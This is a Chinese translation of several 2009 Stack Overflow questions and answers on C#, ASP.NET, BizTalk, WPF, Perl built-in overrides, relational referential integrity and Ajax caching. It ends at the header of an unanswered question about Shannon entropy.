# c# - 可靠地将来自 Web 服务的 XML 提要缓存到文件中

> ID：651088
> 
> 赞同：0
> 
> 时间：2009-03-16T16:12:23.293
> 
> 标签：c#, web-services, caching, file-io

我需要将一些 xml 从 web 服务缓存到本地 xml 文件以供我的 web 应用程序使用。

有两种 Web 服务，一种返回数据，另一种返回数据上次更改的日期/时间。

xml 文件大小范围为 50KB 到 500KB

我目前有一个从执行以下操作的 Windows 调度程序运行的可执行文件。

*   检查上次从 WebService 更改的 DateTime
*   检查 DateTime 本地 xml 文件是否上次修改
*   比较日期以确定是否继续
*   从 web 服务拉取数据到本地字符串
*   将数据写入本地文件 myxml.temp
*   将现有的实时文件 myxml.xml 重命名为 myxml.delete
*   将 myxml.temp 文件重命名为 myxml.xml
*   删除 myxml.delete 文件

我使用 FileInfo.CreateText() 和 TextWriter 执行初始写入。

我使用 FileInfo.MoveTo 和 FileInfo.Delete 执行重命名和删除。

这是相当可靠的，因为重命名很快，但是，由于文件仍在使用中，我们仍然会收到许多拒绝访问错误。

有人对更可靠/更有弹性的方法有任何建议吗？有没有什么内置的东西我可能忽略了管理这样的本地文件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T16:21:10.697

一种选择可能是将每个更新下载到一个新文件名，文件名中带有时间戳

c:\downloads\MyXml20090319-1035.xml

然后，在使用数据的应用程序中，您可以从该目录中选择最新的文件。

您可以随时清理旧数据文件，如果它们现在无法删除，只需在下一次迭代中重试。

# asp.net - 在 Asp.net 中添加自定义控件

> ID：651091
> 
> 赞同：1
> 
> 时间：2009-03-16T16:13:52.430
> 
> 标签：asp.net, sharepoint, controls

我正在创建一个新面板..

```
 public class LicensingPanel : Panel
{
     private LinkButton licenseButton;
    ...
} 
```

然后我在代码中将我的控件添加到 Controls 属性，其中之一是 LinkBut​​ton。

我希望能够对后面的页面代码执行以下操作。

```
protected override void CreateChildControls()
{
    Controls.Add(new LicensingPanel(this));

    base.CreateChildControls();
} 
```

但我收到此错误消息：

“LinkBut​​ton”类型的控件“ctl03”必须放在带有 runat=server 的表单标记内。在 System.Web.UI.Page.VerifyRenderingInServerForm（控制控件）

该页面是一个带有母版页的 SharePoint 页面，它有一个带有 runat=server 的 Form 标记。

任何帮助都会受到极大的欢迎！

最好的祝福，

菲尔

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-16T16:28:12.083

任何具有 MasterPage 的页面，无论是否在 SharePoint 中，都是内容页面。这些页面仅支持内容控件中包含的内容。不支持尝试将 HTML 标记或 ASP.NET 控件直接添加到页面。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-16T16:33:51.243

页面上的哪个位置是您的 LicensingPanel 类型的控件？此控件需要位于表单标记内。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T16:34:23.193

我认为你应该告诉我们更多关于你想用你的代码归档什么。您要在哪里添加控件？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-16T16:37:19.893

我认为您需要完成一些步骤才能在 MOSS 2007 环境中使用某个控件：

1.  您必须将您的自定义控件 DLL 注册为安全的。
2.  您必须在母版页中注册您的自定义控件，以便服务器识别该标记。

FOR DLL: <%@ Register TagPrefix="customcontrolname" Namespace="MyCustomControl" Assembly="MyCustomControl, Version=1.0.0.0, Culture=neutral, PublicKeyToken=123456789abcdefg" %>

对于 ASCX：<%@ Register Src="~/Controls/MyCustomControl.ascx" TagName="MyCustomControl" TagPrefix="customcontrolname" %>

# biztalk - BizTalk 2006，在不同 BizTalk 应用程序中具有不同行为的相同程序集

> ID：651092
> 
> 赞同：1
> 
> 时间：2009-03-16T16:13:54.147
> 
> 标签：biztalk, biztalk-2006

是否可以让相同的程序集在不同的 BizTalk 2006 应用程序中表现不同？

例如，是否可以在程序集中以某种方式访问​​正在使用该实例的 BizTalk 应用程序 ID 或名称，然后使其对不同的 BizTalk 应用程序具有不同的行为？

或者可以通过其他方式完成，而不是对程序集进行版本控制？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-17T13:01:37.813

你到底想完成什么？也就是说，你试图引入什么样的行为差异？

事情的真相是，没有万无一失的方法可以找出您的代码在哪个 BizTalk 应用程序中执行，因为 BizTalk 中的应用程序概念纯粹是一个管理工件。在某些受限情况下，您可以使用 ExplorerOM 访问管理数据库并执行一些查询来确定工件（端口、编排）属于哪个应用程序，但这可能会很慢，并且可能需要您调整安全性。

它也可能不会给您预期的结果，具体取决于您是否有通过消息传递或编排调用跨越应用程序边界的消息。

也许如果你能分享更多关于你需要什么的信息，我可以尝试提供更好的建议！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-17T20:39:59.657

我认为不同程序集的版本控制听起来就像您正在寻找的那样？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-26T08:11:00.840

我通过使用版本控制解决了它，我没有找到其他方法。

我想让同一个 biztalk 应用程序的多个“实例”一起运行，但使用不同的配置（不仅仅是不同的绑定）来模拟不同的环境，但使用相同的 biztalk 实例。因此它可以与同样复制在同一台机器上的其他软件以及代表自己相同环境和不同数据库的外部系统进行交互。

问题是我必须使用不同的连接字符串来定义不同的数据库，每个数据库用于 BTSNTSvc.Exe.Config 文件中的每个环境。但是由于程序集是相同的，我无法让每个 biztalk 应用程序使用它自己的连接字符串，除非每个程序集在运行时知道如何做出该决定（例如，通过知道它属于哪个环境）。

所以现在，我有编译和部署多个版本的脚本，并更改​​要使用的连接字符串的名称以及程序集的版本（使用编译符号）。

谢谢你的帮助。

# architecture - 项目经理与软件架构师

> ID：651093
> 
> 赞同：7
> 
> 时间：2009-03-16T16:13:57.173
> 
> 标签：architecture

[程序经理](http://www.joelonsoftware.com/items/2009/03/09.html)和[软件架构师](https://blog.stackoverflow.com/2009/03/podcast-44/)之间有什么区别？

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2009-03-16T16:17:42.033

项目经理=更适合的项目经理。软件架构师 = 穿着干净 T 恤的软件工程师。

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2009-03-16T16:22:32.753

项目经理：了解客户/市场需求并推动规范。他了解开发环境（语言、工具等），并以开发人员能够理解的方式编写产品规范。如果开发/测试团队需要明确要求，他们会去找项目经理。

架构师：给定一个问题，设计一个软件解决方案。这包括程序控制流、组件所在的位置、它们如何交互和类设计等。

虽然架构师的职位非常明确，但不同的公司对项目经理有不同的含义。

* * *

## 回答 #3

> 赞同：16
> 
> 时间：2009-03-16T16:51:39.937

在“神话般的人月”中，Frederick P.Brooks 将项目经理比作制片人，将软件架构师比作电影剪辑师。

* * *

## 回答 #4

> 赞同：12
> 
> 时间：2009-03-16T16:19:22.713

程序经理：尊重程序员的非程序员

软件架构师：不尊重程序员的程序员

* * *

## 回答 #5

> 赞同：11
> 
> 时间：2009-03-16T17:08:19.210

在当前“基于项目组合的项目管理”的时尚中，项目经理是项目管理办公室的领导职位，负责多个项目经理和多个进行中的项目。项目经理通常存在于大中型企业中，他们拥有项目工件并了解业务。他们向行政级别的管理层报告，并根据预算和时间表生死存亡。标题通常不与软件程序相关，而是程序的一般含义。在项目组合模型中，企业将项目组合组织成程序，每个程序分解为项目。

企业中的软件架构师是负责在企业中集成多个系统和应用程序的技术人员。通过了解业务流程和支持每天运行业务的技术，该人成为架构师。在企业中，建筑师职业轨道已成为具有技术头脑的个人在不诉诸黑暗面（即管理）的情况下取得进步的一种方式。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-03-16T16:32:54.397

项目经理监督可交付成果（例如，产品）的健康状况和进度。这包括管理人员及其时间、预测和消除成本超支、确保各个项目里程碑一致、就可交付成果的状态向利益相关者作出回应、定义标准和基础设施等等。

“软件架构师”是一个有点模糊的术语，它描述了一个输出是软件设计（也可能是构建）的人。这可以是从项目的一部分到整个产品的任何内容。软件架构师与项目经理一起工作，以确保软件的设计符合产品的意图和目标、遵守标准、遵循治理模型中规定的流程、满足财务要求等等。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2009-12-16T21:54:45.533

如果软件不卖，你可以和项目经理（和销售/营销）谈谈，如果软件不工作，你可以和软件架构师谈谈。项目经理更专注于事物的商业方面。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-07-31T12:19:24.737

我在软件开发中遇到过“程序经理”一词的两种完全不同的用法。

一个是我认为的微软版本，类似于其他公司的产品经理。他们是面向外部的，所以他们着眼于“利益相关者”（客户、企业等）对产品的期望，并将其传达给开发团队。我相信微软通常会将项目经理与某种技术负责人配对，后者实际上领导着开发团队。我对这种类型的项目经理没有任何直接经验（至少在那个名字下），我所知道的大部分内容都是通过阅读[Spolsky 文章](http://www.joelonsoftware.com/items/2009/03/09.html)学到的。

该术语的另一种用法是我认为的英国[OGC Program Manager](http://www.ogc.gov.uk/User_roles_in_the_toolkit_programme_manager.asp)用法。由于我在英国工作了 11 年，我不知道这个词在美国或其他地方的使用范围有多广。这种类型的项目经理监督多个项目经理。从这个意义上说，“项目”是一项需要协调多个项目的巨大努力，通常跨越多个学科。一个 IT 程序可能有一个或多个软件开发项目，以及一个用于设计和构建托管基础设施、创建支持组织的项目，以及诸如规划营销活动之类的非技术项目。

“软件架构师”也以不同的方式使用，但一般来说，它们都倾向于比任何类型的项目经理更具技术性的人。它通常是技术领导角色。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-03-16T16:25:21.687

项目经理从客户的角度了解业务需求和产品视图。因此，如果将产品视为项目，这就像项目经理。

软件架构师从开发人员的角度了解产品的技术要求和观点。因此，这就像开发人员担任领导并确定事物的整体结构。

至少我是这样区分它们的。

# synchronization - 同步文件系统，如何检测文件是否已更改？

> ID：651094
> 
> 赞同：1
> 
> 时间：2009-03-16T16:14:06.050
> 
> 标签：synchronization

我需要编写一个简单的备份组件来将文件夹及其子文件夹同步到服务器。对于增量备份，我只想上传更改的文件。跟踪文件系统更改的最佳方法是什么？一些现有的软件，如 tortoisesvn 和 office groove 具有检测文件更改的能力。我想知道实现类似事情的最佳方法是什么。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T16:20:08.813

你的问题有点模棱两可：

**如果您尝试检查所有文件并确定需要将哪些文件发送到备份服务器：**

最简单的方法是比较修改次数；如果您本地系统上的文件在您的备份系统之后被修改，那么它已经更改并且需要更新备份。（可以使用类似的东西来修改文件的修改时间`touch`，但对于简单的情况，您可能不需要担心这一点）

一种更复杂（且计算成本更高）的方法是计算文件的哈希码，并进行比较；如果哈希值不同，则需要进行备份。

**如果您试图检测文件被更改的时刻：**

您可以使用[`FileSystemWatcher`](http://msdn.microsoft.com/en-us/library/system.io.filesystemwatcher.aspx)（在 C#/Windows 中）或您的语言/操作系统的等效项。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T16:21:40.960

如果 Mac OS X 有一个叫做[FSEvents](http://en.wikipedia.org/wiki/FSEvents)的东西。Windows 中也必须为此提供一些服务。

# wpf - 确定 WPF RichTextBox 中选定的 InlineUIContainer

> ID：651101
> 
> 赞同：4
> 
> 时间：2009-03-16T16:15:43.847
> 
> 标签：wpf, richtextbox, selection

我想确定 WPF RichTextBox 中当前插入符号位置是否有 InlineUIContainer（或 BlockUIContainer）。

目前我有一个 RichTextBox 如下；

```
 <RichTextBox SelectionChanged="RichTextBox_SelectionChanged">
        <FlowDocument>
            <Paragraph>
                <Run>Some text before</Run>
                <InlineUIContainer>
                    <Label>I am a label</Label>
                </InlineUIContainer>
                <Run>Some text after</Run>
            </Paragraph>
        </FlowDocument>
    </RichTextBox> 
```

在我尝试使用的 SelectionChanged 事件中；

```
rtf.CaretPosition.GetAdjacentElement(rtf.CaretPosition.LogicalDirection) 
```

...返回null。

我可以使用 MouseDoubleClicked 事件处理程序来做到这一点，如下所示；

```
Point pos = e.GetPosition(rtf);
TextPointer pointer = rtf.GetPositionFromPoint(pos, false);
Console.WriteLine(pointer.GetAdjacentElement(pointer.LogicalDirection)); 
```

但是当 RichTextBox 插入符号位置发生变化时，我真的很想让它工作。

有什么办法可以做到这一点？

提前致谢

马特

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-03-16T17:24:26.990

如果您的 InlineUIContainer 被赋予 ax:Name 属性，您可以使用以下代码专门查找它：

```
if (rtf.Selection.Contains(myInlineUIContainer.ContentStart))
{...} 
```

对于更动态的发现，您需要一个类似这样的循环：

```
foreach (Block block in rtf.Document.Blocks)
        {
            Paragraph p = block as Paragraph;
            if (p != null)
            {
                foreach (Inline inline in p.Inlines)
                {
                    InlineUIContainer iuic = inline as InlineUIContainer;
                    if (iuic != null)
                    {
                        if (rtf.Selection.Contains(iuic.ContentStart))
                        {
                            Console.WriteLine("YES");
                        }
                    }
                }
            }
        } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-11-17T19:58:02.390

您可以使用 CaretPosition.Parent 并使用“is”运算符。

# referential-integrity - 破坏的参照完整性：埃德加科德会说什么？

> ID：651118
> 
> 赞同：1
> 
> 时间：2009-03-16T16:20:33.053
> 
> 标签：referential-integrity, relational-model

我试图理解 Edgar Codd 在 1970 年最初定义的关系模型规则。

具体来说，我对参照完整性是否是他的关系模型的一部分感兴趣。我将尝试在以下示例中进行演示（只是为了使这个问题变得漂亮）：

**顾客**

```
+------+------------
| Name | Address
|------+------------
| John | ....
| Mike | ....
| Kate | ....
+------+------------ 
```

**发票**

```
+------+------------
|  ID  | Customer
|------+------------
|   1  | John
|   2  | John
|   3  | Mary
+------+------------ 
```

现在，显然如您所见，我们有一张客户（外键）为**Mary**的发票。这会违反他的关系模型吗？Edgar Codd 会不会看着这个说，哎呀，这到底是怎么回事？或者他会说，这完全没问题……

这是理论上的问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-16T16:23:29.210

如果 Customers 表中没有名为 Mary 的客户，则表之间不存在参照完整性。具体来说，外键是指不存在的主键。

这会破坏关系模型吗？不，它是在关系模型中定义的（即缺乏参照完整性），并且表明基础数据存在问题。

摘自 Edgar Codd 的“大型共享数据库的数据关系模型”（摘自 Communications of the ACM，第 13 卷，第 6 期，1970 年 6 月）：

> 可能是用户打算将一些其他元素插入到 P 中 - 一个元素的插入会将一致状态转换为一致状态。关键是系统通常无法在不询问其环境（可能是造成不一致的用户）的情况下解决此问题。

因此，假定存在引用完整性问题，并且需要用户或系统通过某种编程方法解决这些问题。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2011-03-23T11:36:09.640

对于被认为是关系完整的语言（Codd 创造的短语），它必须支持一组关系运算符，称为[关系代数](http://en.wikipedia.org/wiki/Relational_algebra)。请注意，没有一个真正的关系代数：Codd 提出了第一个，但其他人已经改进并建立在 Codd 的基础上（例如[The Third Manifesto](http://en.wikipedia.org/wiki/The_Third_Manifesto)），我相信他会认为这是正确和正确的。

参照完整性不是关系运算符，因此不是**语言**关系完整性的要求。**参照完整性约束是DBMS**的有用还是必要的特性是另一回事。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-03-16T17:33:29.337

我阅读了以下内容，清楚地说明了关系模型中包含参照完整性：

> 两个完整性规则适用于每个关系数据库：
> 
> 1 实体完整性：
> 在作为基础关系主键组成部分的任何属性中都不允许使用任何一种类型的标记
> 
> 2 参照完整性：
> 设 D 是一个域，一个或多个单属性主键从中提取它们的值。假设 K 是一个外键，它从域 D 中提取其值。出现在 K 中的每个未标记值也必须作为某个基本关系的主键中的值存在于数据库中。

“[关系数据库中的缺失信息（适用和不适用）](http://doi.acm.org/10.1145/16301.16303) ”，EF Codd，ACM SIGMOD 记录，第一卷。15，没有。4，第 53-78 页，1986 年。

通过“任一类型的标记”，他指的是一个未知值，我们今天使用 NULL。本文提出了两种不同类型的未知值，一种是“适用但缺失”，一种是“不适用”。

通过“未标记”，他的意思是不为 NULL。

* * *

来自@dportas 的重新评论：确实，您甚至不需要引用的关系为空来提出您的论点。它可以包含一些行，但是由于不能说 K 中的 A 标记等于该引用关系中存在的任何值，因此无法说假设的缺失值满足约束条件。因此，允许 A-mark 必须成为一种信念行为，即一旦提供了一个值，它将满足约束，因为否则该行从插入的那一刻起就是无效的，我们必须支持的概念追溯约束违反，这是毫无意义的。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2011-03-16T15:05:09.703

关系模型不需要引用完整性特性来应用于每个关系数据库——如果这些约束不相关或不想要，那将是荒谬的。想象一个由姓名、地址和会员编号组成的俱乐部会员名单。RI 约束不一定有任何用处，但如果数据以关系的形式存储，它仍然是一个关系数据库。

甚至 Codd 的 13 条规则也不要求 RDBMS 必须支持创建 RI 约束的能力。只是外键非常有用，以至于大多数 RDBMS 都希望拥有它们。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2015-07-02T23:32:45.927

首先你要问的是 RM 的 RI 部分：

> 参照完整性是否是他的关系模型的一部分

是的。来自 Codd 的经典著作“你的 DBMS 真的是关系型的吗？” 计算机世界，1985 年 10 月 14 日：

> 然而，至关重要的是要记住关系模型包括三个主要部分：结构部分、操作部分和完整性部分——这是一个经常被遗忘的事实。

> 规则 10：特定于特定关系数据库的完整性约束必须可以在关系数据子语言中定义，并且可以存储在目录中，而不是存储在应用程序中。

但是随后您转述了一个不同且模棱两可的问题：

> 我们有一张发票，其中客户（外键）是 Mary。这会违反他的关系模型吗？

如果您的意思是：RM 是否允许违反声明的 FK，即不被 DBMS 阻止？

不，那将是一个允许您声明 FK 约束但不强制执行它的 DBMS。这样的 DBMS 在这方面是非关系型的。

如果您的意思是：RM 是否允许规定发票客户也必须出现在客户名称中的业务规则（即所有有效的数据库状态都是这样，即从发票客户到客户名称存在 FK 约束）不是向 DBMS 声明（例如通过 FK 声明）？

是的。但这是一个糟糕的设计，因为它允许一些无效状态。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2011-09-13T20:34:22.137

我认为这是否可以取决于您的设计。

发票应包含发票创建或发送时的数据。因此，它似乎需要与客户数据相关但不直接与外键相关的数据，尤其是在您使用自然键时。

例如，假设 Mary Jones 订购了某样东西，并于 2010 年 5 月 31 日开具发票。2010 年 9 月 12 日，她将姓名更改为 Mary Jones-Smith，并搬到了她丈夫的地址。发票是一张及时的照片，应保留 Mary Jones 的姓名和原始地址。最好它还可以保留指向当前客户及其信息的链接（这就是为什么我会在名称更改时在客户表中拥有一个客户 ID 和一个 Customerid inteh incvoice 表的 FK）。但是当 Mary Jones 不再存在于 customer 表中时存储 Mary Jones 不仅没问题，还需要对实际发生的事情进行跟踪。

产品、价格和发票也是如此。您不希望发票反映现在的价格，而是反映发票时的过程，即使这与现在的情况没有直接关系。在这种情况下，Product 表可能更像是一个查找表，而不是真正的父子关系。如果您将产品的所有详细信息存储在发票明细表中，那么您不需要产品的外键，只需在下订单时查找有效产品即可。事实上，如果供应商更改它或完全放弃产品，过去发票的型号肯定不再出现在产品表中。但是您不希望丢失过去购买了哪些产品的数据。

另一方面，如果关系要求数据与当前值保持一致，那么正式的外键是最好的方法。

# perl - 如何重新定义内置 Perl 函数？

> ID：651124
> 
> 赞同：12
> 
> 时间：2009-03-16T16:22:03.783
> 
> 标签：perl, redefine

我想做两件事：

在生产代码中，我想重新定义 open 命令以使我能够添加自动文件日志记录。我从事数据处理应用程序/流程的工作，作为其中的一部分，用户必须确切地知道正在处理哪些文件。如果他们使用的是旧版本的文件，他们找出的一种方法是通读正在处理的文件列表。

我可以创建一个新的*sub*来执行此日志记录并返回一个文件指针，并在我的代码中使用它来代替 open。

如果我可以重新定义 open 并让预先存在的代码从这种行为中受益，那就太好了。我可以这样做吗？

在调试代码中，我想重新定义*printf*命令以插入注释以及指示哪个代码生成该行的书面输出。同样，我有一个可以选择执行此操作的*子程序*，但是转换我现有的代码很乏味。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-03-16T20:14:28.890

如果一个 CORE 子程序有一个原型`*`，它可以被替换。替换当前命名空间中的函数非常简单。

```
#!/usr/bin/perl

use strict;
use warnings;

use subs 'chdir';

sub chdir(;$) {
    my $dir = shift;
    $dir    = $ENV{HOME} unless defined $dir;
    print "changing dir to $dir\n";
    CORE::chdir $dir;
}

chdir("/tmp");
chdir; 
```

如果您也想覆盖所有模块的功能，您可以阅读[文档](http://perldoc.perl.org/CORE.html#OVERRIDING-CORE-FUNCTIONS)。

`*`这是测试 Perl 5.10 中每个函数的代码（它也适用于早期版本）。请注意，某些函数可以被覆盖，该程序会告诉您不能，但被覆盖的函数的行为方式与原始函数不同。

来自 perldoc -f 原型

> 如果内建函数不可覆盖（例如 qw//），或者如果它的参数不能被原型充分表达（例如 system），则原型（）返回 undef，因为内建函数的行为并不像 Perl 函数

```
#!/usr/bin/perl

use strict;
use warnings;

for my $func (map { split } <DATA>) {
    my $proto;
    #skip functions not in this version of Perl
    next unless eval { $proto = prototype "CORE::$func"; 1 };
    if ($proto) {
        print "$func has a prototype of $proto\n";
    } else {
        print "$func cannot be overridden\n";
    }
}

__DATA__
abs          accept         alarm          atan2            bind          
binmode      bless          break          caller           chdir
chmod        chomp          chop           chown            chr
chroot       close          closedir       connect          continue
cos          crypt          dbmclose       defined          delete
die          do             dump           each             endgrent 
endhostent   endnetent      endprotoent    endpwent         endservent
eof          eval           exec           exists           exit
exp          fcntl          fileno         flock            fork
format       formline       getc           getgrent         getgrgid
getgrnam     gethostbyaddr  gethostbyname  gethostent       getlogin
getnetbyaddr getnetbyhost   getnetent      getpeername      getpgrp
getppid      getpriority    getprotobyname getprotobynumber getprotoent
getpwent     getpwnam       getpwuid       getservbyname    getservbyport
getservent   getsockname    getsockopt     glob             gmtime
goto         grep           hex            import           index
int          ioctl          join           keys             kill
last         lc             lcfirst        length           link
listen       local          localtime      lock             log
lstat        m              map            mkdir            msgctl
msgget       msgrcv         msgsnd         my               next
no           oct            open           opendir          ord
our          pack           package        pipe             pop
pos          print          printf         prototype        push
q            qq             qr             quotemeta        qw
qx           rand           read           readdir          readline
readlink     readpipe       recv           redo             ref
rename       require        reset          return           reverse
rewinddir    rindex         rmdir          s                say
scalar       seek           seekdir        select           semctl
semget       semop          send           setgrent         sethostent
setnetent    setpgrp        setpriority    setprotoent      setpwent
setservent   setsockopt     shift          shmctl           shmget
shmread      shmwrite       shutdown       sin              sleep
socket       socketpair     sort           splice           split
sprintf      sqrt           srand          stat             state
study        sub            substr         symlink          syscall
sysopen      sysread        sysseek        system           syswrite
tell         telldir        tie            tied             time
times        tr             truncate       uc               ucfirst
umask        undef          unlink         unpack           unshift
untie        use            utime          values           vec
wait         waitpid        wantarray      warn             write
y            -r             -w             -x               -o
-R           -W             -X             -O               -e
-z           -s             -f             -d               -l
-p           -S             -b             -c               -t
-u           -g             -k             -T               -B
-M           -A             -C 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2009-03-16T17:04:05.900

**对于开放：**这对我有用。

```
use 5.010;
use strict;
use warnings;
use subs 'open';
use Symbol qw<geniosym>;

sub open (*$;@) { 
    say "Opening $_[-1]";
    my ( $symb_arg ) = @_;
    my $symb;
    if ( defined $symb_arg ) { 
        no strict;
        my $caller = caller();
        $symb = \*{$symb_arg};
    }
    else { 
        $_[0] = geniosym;
    }
    given ( scalar @_ ) { 
        when ( 2 ) { return CORE::open( $symb // $_[0], $_[1] ); }
        when ( 3 ) { return CORE::open( $symb // $_[0], $_[1], $_[2] ); }
    }
    return $symb;
}

open PERL4_FH, '<', 'D:\temp\TMP24FB.sql';
open my $lex_fh, '<', 'D:\temp\TMP24FB.sql'; 
```

**对于 Printf：**您检查过这个问题吗？->[我怎样才能挂钩到 Perl 的打印？](https://stackoverflow.com/questions/387702/how-can-i-hook-into-perls-print/388211#388211)

# c# - 向 F5 的 Big IP 产品报告 WCF 应用程序的状态

> ID：651126
> 
> 赞同：1
> 
> 时间：2009-03-16T16:22:18.340
> 
> 标签：c#, wcf, architecture, windows-server-2003, big-ip

在具有自托管 .Net 3.5/WCF 应用程序的 Windows Server 2003 环境中，应用程序如何将其状态报告给 BigIP 本地流量管理器？

示例：我的服务错误之一。我的自定义 WCF 应用程序托管软件（因为 Windows Server 2008 尚不可用且我正在使用 WCF TCP 绑定而编写）检测到这一点，并希望将自己报告为已关闭，直到它可以恢复错误的服务。它需要向 BigIP LTM 报告自己，以便不再向其发送来自客户端的请求。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-17T23:46:10.817

对于您描述的场景，我将使用 iControl（基于 SOAP/XML 的管理 API）让应用程序告诉 BIG-IP 它已关闭。基本上，您只需设置对 BIG-IP 的 SOAP 调用并使用适当的信息调用 Web 服务，以便 BIG-IP 知道应用程序已关闭。

您可以在 DevCentral (devcentral.f5.com) 找到文档并下载 SDK 以及 .NET 程序集。如果您在论坛中需要，也有其他人可以帮助您。

虽然我也会说 BIG-IP 会注意到应用程序已关闭，并应自动将其从服务中删除，直到它注意到它重新投入使用。这可以通过使用连接到节点的监视器来配置。

# c# - 从另一个页面的代码隐藏中获取 ASP.Net 页面的 URL

> ID：651127
> 
> 赞同：5
> 
> 时间：2009-03-16T16:22:24.657
> 
> 标签：c#, asp.net

我试图从页面对象中找出一个页面 url。看来您只能获取当前上下文的路径。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T16:29:02.473

一个页面可以有多个 url。例如，我有一台在家里运行的服务器，站点的 url 会根据我从哪里查看而有所不同。当我在家时，我只使用内部服务器名称，这样流量就不会离开我的家庭网络。当我在其他地方时，我必须使用基于 dyndns.org 的 url。我还可以将几个不同的站点配置为都指向同一个地方。关键是这些信息与页面的类类型无关，甚至与特定实例无关。

因此，页面的 URL 只能根据每个请求确定，果然可以通过查看[`Request.Url`](http://msdn.microsoft.com/en-us/library/system.web.httprequest.url.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T16:36:30.147

希望其中之一对您有所帮助。

[了解 ASP.NET 中的路径](http://www.informit.com/articles/article.aspx?p=101145)

表达式 - 评估

this.TemplateSourceDirectory - /informit/subdir

Request.MapPath("log.txt") - c:\mywebdirs\informit\subdir\log.txt

this.MapPathSecure("log.txt") - c:\mywebdirs\informit\subdir\log.txt

Request.Path - /informit/subdir/pathsample.aspx/extra

Request.FilePath - /informit/subdir/pathsample.aspx

Request.CurrentExecutionFilePath - /informit/subdir/pathsample.aspx

Request.PathInfo - /额外

Request.PhysicalPath - c:\mywebdirs\informit\subdir\pathsample.aspx

Request.PhysicalApplicationPath - c:\mywebdirs\informit\

Request.ApplicationPath - /informit

Request.Url - [http://localhost/informit/subdir/client.aspx/extra](http://localhost/informit/subdir/client.aspx/extra)

Request.RawUrl - /informit/subdir/pathsample.aspx/extra

Response.ApplyAppPathModifier("foo.aspx") - /informit/subdir/foo.aspx

this.ResolveUrl("~/client.aspx") - /informit/pathsample.aspx

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T19:19:20.160

它应该可以通过

`string currentUrl = Page.Request.Url.ToString();`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-10-24T15:55:34.067

如果您要查找的页面与当前页面位于同一目录或其子目录中，则可以使用以下内容（根据需要将子目录页面添加到字符串中）：

```
string targetUrl =  HttpContext.Current.Request.Url.Scheme
                 + "://"
                 + HttpContext.Current.Request.Url.Authority
                 + this.TemplateSourceDirectory + "/Page.aspx"; 
```

# javascript - Ajax 调用对重复请求没有响应

> ID：651129
> 
> 赞同：0
> 
> 时间：2009-03-16T16:22:34.033
> 
> 标签：javascript, ajax

我有一个带有下拉菜单的页面。该`onchange`事件调用一个 Javascript 函数（如下），该函数包括一个 Ajax 块，用于检索数据并填充`TEXTAREA`. 从表面上看，一切正常。

我可以毫无问题地选择列表中的任何项目。但是，如果我选择了以前选择过的项目，Ajax 调用似乎会挂起。看起来可能是一些奇怪的缓存问题之类的。如果我关闭浏览器并重新加载页面，所有项目都会再次工作，直到我重新选择。

当它挂起时，我已经测试了`readyState`and`status`属性，但我什么也没得到。我错过了什么吗？

该页面是身份验证背后的客户端项目，因此我无法发布 URL，但这是 Ajax 代码。这是在 PHP 页面中，但没有与此相关的 PHP 脚本。

```
function getText( id ) {
var txt = document.getElementById( "MyText" );

txt.disabled = "disabled";
txt.innerText = "";
txt.className = "busy";

var oRequest = zXmlHttp.createRequest();
oRequest.open( "get", "get_text.php?id=" + id, true );
oRequest.send( null );

oRequest.onreadystatechange = function() {
    if( oRequest.readyState == 4 ) {
        if( oRequest.status == 200 ) {
            txt.innerText = oRequest.responseText;
        } else {
            txt.innerText = oRequest.status + ": " + oRequest.statusText;   
        }

        txt.disabled = "";
        txt.className = "";

        oRequest = null;
    }
}} 
```

*编辑：*代码块似乎有点古怪；它不会让我包括决赛`}`，除非它与前一个在同一行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-16T16:52:23.930

您在发送请求*后*`onreadystatechange`设置功能。如果它需要很长时间（即如果它到达服务器），这可能会起作用，因为在它尝试调用回调之前会有延迟。

 *但是，如果页面被缓存，浏览器可能会尝试`onreadystatechange`立即调用该`send`方法。将您的作业移至代码`onreadystatechange`之前`open/send`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-18T12:34:11.593

嗨，缓存是由于重复调用相同的 url。如果您动态更改 URl，则可以解决此问题。就像通过在请求中添加带有当前时间的查询字符串（或任何随机重新生成的数字），您可以更改 url 而不会影响结果

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T16:48:08.980

我猜你遇到了缓存问题。我注意到 Internet Explorer 在缓存 ajax 调用方面比 Firefox 更积极。确定正在发生的事情的一种方法是使用 Fiddler2。此应用程序监控您的网络流量，您将能够查看浏览器是否正在发出请求，以及您获得的响应中返回的缓存标头。

[您可以从http://www.fiddlertool.com/fiddler/](http://www.fiddlertool.com/fiddler/)下载 fiddler2

# compression - 香农熵公式。帮助我的困惑

> ID：651135
> 
> 赞同：8
> 
